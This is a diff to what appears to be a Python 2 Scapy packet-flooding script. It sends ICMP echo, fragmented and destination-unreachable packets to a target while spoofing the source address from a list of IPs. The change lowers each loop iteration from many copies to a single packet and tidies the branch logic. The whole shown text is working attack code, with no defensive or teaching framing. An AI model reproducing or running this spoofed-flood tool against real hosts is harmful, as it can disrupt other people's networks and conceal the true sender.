@@ -30,10 +30,10 @@ count = 0
 while(count < int(n_msg)):
 	count += 1
 	if type == "1":
-		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP())*int(n_msg), iface=interface)
-	if type == "2":
-		send((IP(dst=dst_ip, src=ips[count%len(ips)], flags="MF", proto = 17, frag = 0)/ICMP()/("load"*int(n_msg)))*int(n_msg), iface=interface)
-	if type == "3":
-		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP(type=3, code=3))*int(n_msg), iface=interface)
+		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP()), iface=interface)
+	elif type == "2":
+		send((IP(dst=dst_ip, src=ips[count%len(ips)], flags="MF", proto = 17, frag = 0)/ICMP()/("load"*int(1))), iface=interface)
+	elif type == "3":
+		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP(type=3, code=3)), iface=interface)
 	else:
 		print "Type unknown"
